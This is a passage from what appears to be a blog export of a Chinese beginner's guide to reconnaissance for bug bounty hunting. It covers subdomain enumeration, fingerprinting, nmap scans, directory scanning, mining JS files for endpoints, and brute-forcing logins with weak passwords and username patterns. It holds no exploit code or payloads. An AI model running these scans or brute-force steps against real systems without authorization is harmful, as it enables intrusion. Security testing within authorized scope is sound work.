style=none&taskId=u680f6578-9ead-4a4d-a566-d93f3fb8e26&width=1182)\n2、点击Application\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979884349-2daca2ef-6982-41b2-bb71-5c764816e908.png#clientId=u713ba10f-a757-4&from=paste&height=399&id=u951102d4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=798&originWidth=1772&originalType=binary&ratio=1&size=290368&status=done&style=none&taskId=ud0a0670c-1fa3-4315-867c-25409dd85f8&width=886)\n3、在Frames->top->Scripts中能够获取当前页面请求到的所有JS\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979911722-aedd9206-580a-476c-aafe-5e99d91a2d47.png#clientId=u713ba10f-a757-4&from=paste&height=604&id=u785851a2&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1208&originWidth=1148&originalType=binary&ratio=1&size=133350&status=done&style=none&taskId=udc4effe1-a736-4b7d-884e-b10381b8c03&width=574)\n4、火狐浏览器的话，则是在调试中\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980094740-b4afaf82-8f10-4f64-b368-da3faa3f5d93.png#clientId=u713ba10f-a757-4&from=paste&height=323&id=ua48ca828&margin=%5Bobject%2Object%5D&name=image.png&originHeight=646&originWidth=1646&originalType=binary&ratio=1&size=188824&status=done&style=none&taskId=ucae14475-c2e8-489d-98d3-a672350edf4&width=823)\n5、如果你请求的JS文件内容都叠在了前几行的话，下面这个键可以帮你美化输出\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980174451-835cf97c-8c17-4d2a-a372-469073a78281.png#clientId=u713ba10f-a757-4&from=paste&height=269&id=u80fc4db5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=850&originWidth=1420&originalType=binary&ratio=1&size=78688&status=done&style=none&taskId=ud815e24c-4503-40d1-a91c-ae3ec92a358&width=449)\n6、在JS文件中，可以尤为注意带有api字眼的文件或内容，例如下面这里我发现了一个接口。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634980516041-202ef7c0-0773-45fc-8ea0-8935ad385603.png#clientId=u713ba10f-a757-4&from=paste&height=427&id=udeb8bb8a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=854&originWidth=1400&originalType=binary&ratio=1&size=199487&status=done&style=none&taskId=ue53b03c2-3b94-4dda-8b57-943ff687ffe&width=700)\n\n## 0x10 小程序、APP\n\nweb端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。也就是说，我们在小程序或者APP上，一样能够挖掘web端的漏洞如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。\n\n```\n#小程序抓包、APP抓包参考链接：\nhttps://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56g\nhttps://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEsw\nhttps://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLg\nhttps://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig\n```\n\n## 0x11 总结\n\n​\t\t以上就是我个人挖掘SRC的一些信息收集思路，挖掘SRC有的时候真的很看运气，也许别人对一个接口简单Fuzz，便出了一个注入，而我们花了几天，还是一直看到返回内容为404。所以有的时候真的可以换个站试试，也许就挖到高危甚至严重了～\n​\t\t作为一名SRC小白，以上内容均为小弟拙见，希望能够通过这篇文章，帮到更多的网络安全小白，没能帮上大佬们真的很抱歉～后续也会持续提高自己，将学到的更多的东西分享给大家。\n","slug":"src漏洞挖掘之有效信息收集","published":1,"updated":"2021-10-25T06:34:11.187Z","_id":"ckv3u4ogm0000ovq37wh19riy","comments":1,"layout":"post","photos":[],"link":"","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区</p>\n<p>作者：ajie</p>\n</blockquote>\n<pre><code>说到信息收集，网上已经有许多文章进行描述了，那么从正常的子域名、端口、旁站、C段等进行信息收集的话，对于正常项目已经够用了，但是挖掘SRC的话，在诸多竞争对手的“帮助”下，大家收集到的信息都差不多，挖掘的漏洞也往往存在重复的情况。\n  那么现在我就想分享一下平时自己进行SRC挖掘过程中，主要是如何进行入手的。以下均为小弟拙见，大佬勿喷。\n</code></pre>\n<h2 id=\"0x01-确定目标\"><a href=\"#0x01-确定目标\" class=\"headerlink\" title=\"0x01 确定目标\"></a>0x01 确定目标</h2><p>个人是非常讨厌无目标随便打的，有没有自己对应的SRC应急响应平台不说，还往往会因为一开始没有挖掘到漏洞而随意放弃，这样往往不能挖掘到深层次的漏洞。挖到的大多数是大家都可以简单挖到的漏洞，存在大概率重复可能。所以在真的想要花点时间在SRC漏洞挖掘上的话，建议先选好目标。<br>    那么目标怎么选呢，考虑到收益回报与付出的比例来看，建议是从专属SRC入手，特别在一些活动中，可以获取比平时更高的收益。<br>微信搜一搜：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919905280-6a3474d5-e288-40e0-be14-a11ca5a37bcb.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=u8b4a879d&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=333456&status=done&style=none&taskId=u74e51aee-8625-4c5e-b368-f880fa9654b&width=680\" alt=\"image.png\"><br>百度搜一搜：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919958148-21279f08-65f5-45e2-93cc-37781713440c.png#clientId=u713ba10f-a757-4&from=paste&height=668&id=ubea7849e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1336&originWidth=1784&originalType=binary&ratio=1&size=467822&status=done&style=none&taskId=u40ba20aa-3b6f-465a-b6ff-105b03a1cac&width=892\" alt=\"image.png\"><br>现在有活动的src已经浮现水面了，那么我们就可与从中选择自己感兴趣的SRC。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963068419-ddbf4fb7-605b-46a5-aa91-139da2bd03c9.png#clientId=u713ba10f-a757-4&from=paste&height=706&id=u4d43608b&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1412&originWidth=1726&originalType=binary&ratio=1&size=575771&status=done&style=none&taskId=u7150b32d-8964-4f4b-8100-3de307b4870&width=863\" alt=\"image.png\"></p>\n<h2 id=\"0x02-确认测试范围\"><a href=\"#0x02-确认测试范围\" class=\"headerlink\" title=\"0x02 确认测试范围\"></a>0x02 确认测试范围</h2><p>前面说到确定测什么SRC，那么下面就要通过一些方法，获取这个SRC的测试范围，以免测偏。</p>\n<h3 id=\"1、公众号\"><a href=\"#1、公众号\" class=\"headerlink\" title=\"1、公众号\"></a>1、公众号</h3><p>从公众号推文入手，活动页面中可以发现测试范围<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963158654-f2016b05-9be3-4cd7-9bda-ea55a87defb1.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u077f22ee&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=190701&status=done&style=none&taskId=u56153bbe-9613-4ac9-96e0-549a84f1c4b&width=726\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963557707-c9d9fa67-1108-49c4-b38a-a74b34a3907f.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u1c25375f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=285450&status=done&style=none&taskId=ue71919ac-0609-45cc-bc63-c3b9f4d2e1c&width=726\" alt=\"image.png\"></p>\n<h3 id=\"2、应急响应官网\"><a href=\"#2、应急响应官网\" class=\"headerlink\" title=\"2、应急响应官网\"></a>2、应急响应官网</h3><p>在应急响应官网，往往会有一些活动的公告，在里面可以获取到相应的测试范围。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963624546-d5d91332-8080-4b77-9972-77fc8abb52bb.png#clientId=u713ba10f-a757-4&from=paste&height=627&id=u128b3210&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1254&originWidth=2206&originalType=binary&ratio=1&size=321049&status=done&style=none&taskId=u0aa25af0-c011-434c-92f5-f7e3a65d236&width=1103\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963709884-04818b7a-2686-4c31-b96b-270fd21af35b.png#clientId=u713ba10f-a757-4&from=paste&height=656&id=u3228ec56&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1312&originWidth=2382&originalType=binary&ratio=1&size=592096&status=done&style=none&taskId=u83999522-9aaa-4b01-b710-a57b9ff4f7f&width=1191\" alt=\"image.png\"></p>\n<h3 id=\"3、爱企查\"><a href=\"#3、爱企查\" class=\"headerlink\" title=\"3、爱企查\"></a>3、爱企查</h3><p>从爱企查等商业查询平台获取公司所属域名<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964085716-15745fa8-785a-4209-b610-668ece5133a0.png#clientId=u713ba10f-a757-4&from=paste&height=484&id=u412ef52f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=968&originWidth=2188&originalType=binary&ratio=1&size=786218&status=done&style=none&taskId=u55826600-0854-44f8-accb-54e3f12c347&width=1094\" alt=\"image.png\"><br>搜索想要测试等SRC所属公司名称，在知识产权-&gt;网站备案中可以获取测试范围。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964167749-6d7913b9-a4be-41ce-a417-88f49ebd7673.png#clientId=u713ba10f-a757-4&from=paste&height=567&id=u96bf1fb3&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1134&originWidth=1884&originalType=binary&ratio=1&size=298889&status=done&style=none&taskId=ua446ee4f-aa26-41c6-8e34-ba5e91db54e&width=942\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964215181-046d3df9-0dbb-44f2-ba89-59ecdee77f71.png#clientId=u713ba10f-a757-4&from=paste&height=665&id=uf3208897&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1330&originWidth=1836&originalType=binary&ratio=1&size=280408&status=done&style=none&taskId=u8bb717b4-4748-4fbd-b919-6102ba1883b&width=918\" alt=\"image.png\"></p>\n<h2 id=\"0x03-子域名-oneforall\"><a href=\"#0x03-子域名-oneforall\" class=\"headerlink\" title=\"0x03 子域名(oneforall)\"></a>0x03 子域名(oneforall)</h2><p>拿到域名之后，下一步我考虑使用oneforall扫描获取子域名，就像网上信息收集的文章一样，主域名的站点不是静态界面就是安全防护等级极强，不是随便就能够发现漏洞的，我们挖掘SRC也是要从子域名开始，从边缘资产或一般资产中发现漏洞。<br>工具下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></figure>\n<p>具体用法如下：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634967168625-da7d57b5-19e1-4f9c-91a2-cd55e8072344.png#clientId=u713ba10f-a757-4&from=paste&height=442&id=u73c9b970&margin=%5Bobject%2Object%5D&name=image.png&originHeight=884&originWidth=1460&originalType=binary&ratio=1&size=385397&status=done&style=none&taskId=ub7b3972f-c412-4a4e-a3c0-224717feaa2&width=730\" alt=\"image.png\"><br>常用的获取子域名有2种选择，一种使用–target指定单个域名，一种使用–targets指定域名文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 oneforall.py --target example.com run</span><br><span class=\"line\">python3 oneforall.py --targets ./domains.txt run</span><br></pre></td></tr></table></figure>\n<p>其他获取子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等，这里就不一一阐述了，大体思路是一样等，获取子域，然后从中筛选边缘资产，安全防护低资产。</p>\n<h2 id=\"0x04-系统指纹探测\"><a href=\"#0x04-系统指纹探测\" class=\"headerlink\" title=\"0x04 系统指纹探测\"></a>0x04 系统指纹探测</h2><p>通过上面的方法，我们可以在/OneForAll-0.4.3/results/路径下获取以域名为名字的csv文件。里面放入到便是扫描到到所有子域名以及相应信息了。<br>下一步便是将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。下面介绍平时使用的2款工具：</p>\n<h3 id=\"1、Ehole\"><a href=\"#1、Ehole\" class=\"headerlink\" title=\"1、Ehole\"></a>1、Ehole</h3><p>下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/EdgeSecurityTeam/EHole</span><br></pre></td></tr></table></figure>\n<p>使用方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./Ehole-darwin -l url.txt   //URL地址需带上协议,每行一个</span><br><span class=\"line\">./Ehole-darwin -f 192.168.1.1/24  //支持单IP或IP段,fofa识别需要配置fofa密钥和邮箱</span><br><span class=\"line\">./Ehole-darwin -l url.txt -json export.json  //结果输出至export.json文件</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968178111-36292547-bea8-487c-a8cf-722c63427df3.png#clientId=u713ba10f-a757-4&from=paste&height=415&id=u3671b8ae&margin=%5Bobject%2Object%5D&name=image.png&originHeight=830&originWidth=1460&originalType=binary&ratio=1&size=320488&status=done&style=none&taskId=u181ebb87-7fc2-4806-81f9-6a3c42cf463&width=730\" alt=\"image.png\"></p>\n<h3 id=\"2、Glass\"><a href=\"#2、Glass\" class=\"headerlink\" title=\"2、Glass\"></a>2、Glass</h3><p>下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/s7ckTeam/Glass</span><br></pre></td></tr></table></figure>\n<p>使用方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 Glass.py -u http://www.examples.com  // 单url测试</span><br><span class=\"line\">python3 Glass.py -w domain.txt -o 1.txt  // url文件内</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968385558-f19e053b-b480-4bbb-8995-3cc50cb19ea1.png#clientId=u713ba10f-a757-4&from=paste&height=499&id=uc057208f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=998&originWidth=1460&originalType=binary&ratio=1&size=357066&status=done&style=none&taskId=u2dd4f645-9400-4a16-90f9-567e1292a6c&width=730\" alt=\"image.png\"></p>\n<h2 id=\"0x05-框架型站点漏洞测试\"><a href=\"#0x05-框架型站点漏洞测试\" class=\"headerlink\" title=\"0x05 框架型站点漏洞测试\"></a>0x05 框架型站点漏洞测试</h2><p>前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，我们可以优先进行测试。<br>类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971752296-14f4cc8b-a9ad-4f4a-a52d-b37290bf0889.png#clientId=u713ba10f-a757-4&from=paste&height=670&id=ue2eb2d79&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1340&originWidth=1796&originalType=binary&ratio=1&size=633891&status=done&style=none&taskId=uc617d959-80c1-4194-ba8a-5a20f30043a&width=898\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634971772511-ad2c33fa-0dcf-4e7b-8a36-ada77f0d208d.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=uf7ff8327&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=311843&status=done&style=none&taskId=u10544bf0-4a12-4c42-bf41-7e9c5d45057&width=680\" alt=\"image.png\"></p>\n<h2 id=\"0x06-非框架型站点漏洞测试\"><a href=\"#0x06-非框架型站点漏洞测试\" class=\"headerlink\" title=\"0x06 非框架型站点漏洞测试\"></a>0x06 非框架型站点漏洞测试</h2><p>前面测试完框架型的站点了，之后就应该往正常网站，或者经过了二开未能直接检测出指纹的站点进行渗透了。那么对于这类站点，最经常遇到的便是登录框，在这里，我们便可以开始测试了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634972124912-1bf2fa5c-a1ac-40b0-b6b9-71fea6341075.png#clientId=u713ba10f-a757-4&from=paste&height=416&id=uc47928c9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=832&originWidth=1322&originalType=binary&ratio=1&size=623185&status=done&style=none&taskId=ubc371a35-7ed8-4893-9488-84188fd50cf&width=661\" alt=\"image.png\"><br>1、用户名枚举<br>抓包尝试是否用户名存在与不存在的情况，返回结果不同。<br>2、验证码<br>是否存在验证码，验证码是否可以抓包截断绕过，验证码是否可以为空。<br>3、暴力破解<br>下面是我收集的集中常见的用户名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.弱口令用户名如admin,test,ceshi等</span><br><span class=\"line\">2.员工姓名全拼，员工姓名简拼</span><br><span class=\"line\">3.公司特征+员工工号/员工姓名</span><br><span class=\"line\">4.员工工号+姓名简拼</span><br><span class=\"line\">5.员工姓名全拼+员工工号</span><br><span class=\"line\">6.员工姓名全拼+重复次数，如zhangsan和zhangsan01</span><br><span class=\"line\">7.其他</span><br></pre></td></tr></table></figure>\n<p>关于暴力破解我要扯一句了，就是关于密码字典的问题。经常会听到某人说他的字典多么多么的大，有好几个G之类的，但是在我觉得，这很没有必要，有些密码是你跑几天都跑不出来的，就算字典确实够大，也没有必要这样跑，可能影响心情不说，大规模地暴力破解，很容易让人觉得你在拒绝服务攻击。<br>​</p>\n<p>其实我的话一般跑一跑弱口令就差不多了。<br>关于弱口令字典的问题，我也想说一嘴，你最好看看，你字典里面的admin、123456、password处在什么位置。记得之前玩CTF的时候，默认密码123456，但是那个师傅死活做不出来，后面一看，字典里面居然没有123456这个密码。。。<br>​</p>\n<p>这里推荐一个字典，个人感觉还是挺好用的。当然更多的是需要自己不断更新。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/fuzz-security/SuperWordlist</span><br></pre></td></tr></table></figure>\n<p>4、工具cupp和cewl<br>对于一些情况，密码不是直接使用弱口令，而是通过一些公司的特征+个人信息制作的，那么这个时候，我们的字典便不能直接使用了，需要在这之前加上一些特征，例如阿里SRC可能是a；百度SRC可能是bd等。<br>下面2款kali自带等工具，可以通过收集信息，生成好用的字典，方便渗透。说真的，在渗透测试过程中，弱口令，YYDS！<br>具体使用说明和工具介绍，可以查看文章：<br><a href=\"https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A\">https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A</a><br>5、自行注册<br>如果能够注册那就好办了，自己注册一下账户即可。<br>6、小总结<br>对于非框架的站点，登录接口一般是必不可少的，可能就在主页，也可能在某个路径下，藏着后台的登录接口，在尝试了多种方法成功登录之后，记得尝试里面是否存在未授权漏洞、越权等漏洞。<br>这里借用来自WS师傅的建议：可以直接扫描出来的洞，基本都被交完了，可以更多往逻辑漏洞方面找。登录后的漏洞重复率，比登录前的往往会低很多。</p>\n<h2 id=\"0x07-端口扫描\"><a href=\"#0x07-端口扫描\" class=\"headerlink\" title=\"0x07 端口扫描\"></a>0x07 端口扫描</h2><p>前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜哦～<br>端口扫描也算是老生常谈了，市面上也有很多介绍端口扫描的工具使用方法，这里也不细说了，就放出平时使用的命令吧。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v  examples.com</span><br><span class=\"line\"></span><br><span class=\"line\">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x08-目录扫描dirsearch\"><a href=\"#0x08-目录扫描dirsearch\" class=\"headerlink\" title=\"0x08 目录扫描dirsearch\"></a>0x08 目录扫描dirsearch</h2><p>目录扫描在渗透测试过程中我认为是必不可少的，一个站点在不同目录下的不同文件，往往可能有惊喜哦。<br>个人是喜欢使用dirserach这款工具，不仅高效、页面也好看。市面上还有例如御剑、御剑t00ls版等，也是不错的选择。<br>dirsearch下载地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/maurosoria/dirsearch</span><br></pre></td></tr></table></figure>\n<p>具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 dirsearch.py -u www.xxx.com -e * -t 2</span><br></pre></td></tr></table></figure>\n<p>关键的地方是大家都可以下载这款工具，获取它自带的字典，那么路径的话，便是大家都能够搜得到的了，所以这里我推荐是可以适当整合一些师傅们发出来的路径字典到/dirsearch-0.4.2/db/dicc.txt中。例如我的话，是增加了springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634974064316-4b6934a1-20a6-4491-bd58-90ce95839dc2.png#clientId=u713ba10f-a757-4&from=paste&height=418&id=ucf26188a&margin=%5Bobject%2Object%5D&name=image.png&originHeight=836&originWidth=1364&originalType=binary&ratio=1&size=132938&status=done&style=none&taskId=uec31186e-75ff-4ff7-bd63-c714e41f7df&width=682\" alt=\"image.png\"></p>\n<h2 id=\"0x09-JS信息收集\"><a href=\"#0x09-JS信息收集\" class=\"headerlink\" title=\"0x09 JS信息收集\"></a>0x09 JS信息收集</h2><p>在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，我们还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。</p>\n<h4 id=\"1、JSFinder\"><a href=\"#1、JSFinder\" class=\"headerlink\" title=\"1、JSFinder\"></a>1、JSFinder</h4><p>工具下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></figure>\n<p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。个人觉得美中不足的地方便是不能对获取到到URL进行一些过滤，在某些情况下，JS文件中可以爬取非常多的URL，这其中可能大部分是页面空或者返回200但是页面显示404的。来自HZ师傅的建议，可以修改一下工具，基于当前的基础上，检测获取的URL是否可以访问，访问后的页面大小为多少，标题是什么。。。<br>思路放这了，找个时间改一改？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#检测URL状态码</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;xxxx&#x27;</span><br><span class=\"line\">request = requests.get(url)</span><br><span class=\"line\">httpStatusCode = request.status_code</span><br><span class=\"line\">if httpStatusCode == 200:</span><br><span class=\"line\">    xxxx</span><br><span class=\"line\">else:</span><br><span class=\"line\">\t\txxxx</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#检测URL返回包大小</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">def hum_convert(value):</span><br><span class=\"line\">    units = [&quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot;]</span><br><span class=\"line\">    size = 1024.0</span><br><span class=\"line\">    for i in range(len(units)):</span><br><span class=\"line\">        if (value / size) &lt; 1:</span><br><span class=\"line\">            return &quot;%.2f%s&quot; % (value, units[i])</span><br><span class=\"line\">        value = value / size</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(&#x27;https://www.baidu.com&#x27;)</span><br><span class=\"line\">r.status_code</span><br><span class=\"line\">r.headers</span><br><span class=\"line\"></span><br><span class=\"line\">length = len(r.text)</span><br><span class=\"line\">print(hum_convert(length))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取网站标题</span><br><span class=\"line\">#-----------------------</span><br><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">urllib.request</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">url = urllib.request.urlopen(&#x27;http://www.xxx.com&#x27;)</span><br><span class=\"line\">html = url.read().decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">title=re.findall(&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;,html)</span><br><span class=\"line\">print (title)</span><br></pre></td></tr></table></figure>\n<h4 id=\"2、JS文件\"><a href=\"#2、JS文件\" class=\"headerlink\" title=\"2、JS文件\"></a>2、JS文件</h4><p>JS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。<img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979609194-1625b496-f395-46ef-a57b-d40812e3ca83.png#clientId=u713ba10f-a757-4&from=paste&height=41&id=udf5e6bd9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=82&originWidth=1052&originalType=binary&ratio=1&size=16086&status=done&style=none&taskId=u48d38e72-9bd0-43d2-ad50-bcc0ce56aec&width=526\" alt=\"image.png\"><br>对于渗透测试来说，JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现。下面我将介绍如何发现这些隐藏的接口。<br>1、首先在某个页面中，鼠标右键，选择检查<img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979847526-bc9f09c0-1a90-455d-ba9e-21f6a85077b2.png#clientId=u713ba10f-a757-4&from=paste&height=727&id=u06aaf698&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1454&originWidth=2364&originalType=binary&ratio=1&size=884946&status=done&style=none&taskId=u680f6578-9ead-4a4d-a566-d93f3fb8e26&width=1182\" alt=\"image.png\"><br>2、点击Application<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1634979884349-2daca2ef-6982-41b2-bb71-5c764816e908.png#clientId=u713ba10f-a757-4&from=paste&height=399&id=u951102d4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=798&originWidth=1772&originalType=binary&ratio=1&size=290368&status=done&style=none&taskId=ud0a0670c-1fa3-4315-867c-25409dd85f8&width=886\" alt=\"image.png\"><br>3、在Frames-&gt;top-&gt;Scripts中能够获取当前页面请求到的所有JS<br><img 